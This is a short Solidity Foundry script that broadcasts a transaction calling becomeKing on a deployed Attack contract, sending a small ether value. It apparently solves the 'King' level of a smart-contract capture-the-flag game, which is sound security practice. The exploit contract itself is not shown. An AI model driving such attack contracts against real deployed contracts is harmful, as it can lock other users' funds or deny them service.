// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Attack} from "src/king/Attack.sol";

contract AttackScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        // address ownerAddress = vm.addr(deployerPrivateKey);
        Attack attack = Attack(payable(0x9720e77EE5a4dD3f6017735c766695e1bB879C39));
        vm.startBroadcast(deployerPrivateKey);
        attack.becomeKing{value:1100000000000000}();
        vm.stopBroadcast();
    }
}